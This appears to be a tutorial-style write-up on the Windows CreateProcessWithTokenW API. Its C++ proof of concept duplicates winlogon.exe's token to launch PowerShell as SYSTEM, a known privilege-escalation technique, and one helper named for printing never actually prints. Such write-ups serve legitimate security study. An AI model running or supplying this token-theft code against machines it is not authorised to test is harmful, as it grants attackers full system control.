# Summary

**`CreateProcessWithTokenW`** is a Windows API function originating from **`advapi32.dll`** that creates a new process and its primary thread with a specified token. This function is used when you need to create a process with the security context (identity and privileges) of a different user than the calling process.

The function requires a handle to a primary token, which represents the user under whose context the new process will run. This token can be obtained through various means, such as duplicating an existing token with **`DuplicateTokenEx`**.

Here are the parameters of this function:

```
BOOL CreateProcessWithTokenW(
  HANDLE                hToken,
  DWORD                 dwLogonFlags,
  LPCWSTR               lpApplicationName,
  LPWSTR                lpCommandLine,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCWSTR               lpCurrentDirectory,
  LPSTARTUPINFOW        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

**`CreateProcessWithTokenW`** relies on the Secondary Logon service (seclogon). The Secondary Logon service is used by Windows to allow a user to log on with a different user account than the one currently being used by the operating system session. This service is responsible for creating processes under different security contexts, especially when we need to run applications or tasks with different privileges or user credentials than the currently logged-in user.

![image](https://github.com/DebugPrivilege/WindowsAP1/assets/63166600/f734140b-781d-48c1-9279-d59e3dab071b)


# Proof of Concept

This POC demonstrates obtaining a security token from the winlogon process, and then using it to create an impersonated process running PowerShell. It starts with identifying the process ID of winlogon.exe using process snapshotting, then opens and duplicates its token, and creates a new PowerShell process with that token.

```c
#include <Windows.h>
#include <memory>
#include <iostream>
#include <string>
#include <TlHelp32.h>

// Function to retrieve and print information about the specified token
void PrintTokenUserInformation(HANDLE TokenHandle)
{
    DWORD ReturnLength;
    std::unique_ptr<BYTE[]> TokenInformation;

    // Get the size of the token information
    if (!GetTokenInformation(TokenHandle, TokenUser, nullptr, 0, &ReturnLength))
    {
        DWORD ErrorCode = GetLastError();
        if (ErrorCode != ERROR_INSUFFICIENT_BUFFER)
        {
            std::cerr << "Error getting token information size: " << ErrorCode << std::endl;
            return;
        }
    }
    // Allocate memory for the token information
    TokenInformation = std::make_unique<BYTE[]>(ReturnLength);
    PTOKEN_USER pTokenUser = reinterpret_cast<PTOKEN_USER>(TokenInformation.get());
    if (!GetTokenInformation(TokenHandle, TokenUser, pTokenUser, ReturnLength, &ReturnLength))
    {
        DWORD ErrorCode = GetLastError();
        std::cerr << "Error getting token information: " << ErrorCode << std::endl;
        return;
    }
}


DWORD getWinlogonProcessId()
{
    // Initialize the process ID to 0
    DWORD logonPID = 0;

    // Create a snapshot of the system's processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
    {
        // If the snapshot creation fails, print an error message
        DWORD errorCode = GetLastError();
        char errorMessage[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nullptr, errorCode, 0, errorMessage, sizeof(errorMessage), nullptr);
        std::cerr << "Error creating toolhelp snapshot: " << errorCode << " - " << errorMessage << std::endl;
        return logonPID;
    }

    // Iterate through the list of processes
    PROCESSENTRY32W processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(snapshot, &processEntry))
    {
        do
        {
            // Check if the process name is "winlogon.exe"
            std::wstring processName = processEntry.szExeFile;
            if (_wcsicmp(processName.c_str(), L"winlogon.exe") == 0)
            {
                // If it is, set the process ID and break out of the loop
                logonPID = processEntry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }
    else
    {
        // If there is an error enumerating the processes, print an error message
        std::cerr << "Error enumerating processes: " << GetLastError() << std::endl;
    }

    // Close the snapshot handle
    CloseHandle(snapshot);

    // Return the process ID
    return logonPID;
}


void CreateImpersonatedProcess(HANDLE NewToken)
{
    bool impersonatedProcessCreated;

    STARTUPINFO startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);

    PROCESS_INFORMATION processInformation = { 0 };

    // Create a new process with the specified token and logon type
    impersonatedProcessCreated = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE,
        L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        nullptr, 0, nullptr, nullptr, &startupInfo, &processInformation);

    // Check if the impersonated process was successfully created. If not, print an error message and return.
    if (!impersonatedProcessCreated)
    {
        DWORD errorCode = GetLastError();
        std::cerr << "Error creating impersonated process: " << errorCode << std::endl;
        return;
    }

    PrintTokenUserInformation(NewToken);
    CloseHandle(NewToken);
}

void PrintCurrentProcessTokenInfo()
{
    // Handle to the current process
    HANDLE hCurrent = GetCurrentProcess();

    // Check if an error occurred while getting the current process
    if (hCurrent == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Error getting current process: " << GetLastError() << std::endl;
        return;
    }

    // Handle to the token for the current process
    HANDLE TokenHandle = nullptr;

    // Open the token for the current process
    BOOL OpenToken = OpenProcessToken(hCurrent, TOKEN_QUERY, &TokenHandle);
    if (!OpenToken)
    {
        std::cerr << "Error opening process token: " << GetLastError() << std::endl;
        CloseHandle(hCurrent);
        return;
    }

    // Print the user information for the token
    PrintTokenUserInformation(TokenHandle);

    // Close the token handle
    CloseHandle(TokenHandle);
}

int main()
{
    // Check the token of the current process
    HANDLE TokenHandle = nullptr;
    HANDLE hCurrent = GetCurrentProcess();
    OpenProcessToken(hCurrent, TOKEN_QUERY, &TokenHandle);
    PrintTokenUserInformation(TokenHandle);
    CloseHandle(TokenHandle);

    // Find the process ID of the winlogon process
    DWORD winlogonPID = getWinlogonProcessId();

    // Obtain a duplicate of the winlogon process's token and create an impersonated process using it
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, winlogonPID);
    OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &TokenHandle);
    HANDLE NewToken;
    DuplicateTokenEx(TokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &NewToken);
    CreateImpersonatedProcess(NewToken);

    return 0;
}
```

Here we can see a new console window is launched, executing PowerShell under the **`NT AUTHORITY\SYSTEM`** context.

![image](https://github.com/DebugPrivilege/WindowsAP1/assets/63166600/67d41ef1-ab77-467b-a362-b5fa28f4e137)

We can use **System Informer** as well to view that PowerShell is running as the **`NT AUTHORITY\SYSTEM`** context.

![image](https://github.com/DebugPrivilege/WindowsAP1/assets/63166600/fc8ba0a1-e036-4231-8d07-e4f5ea175720)

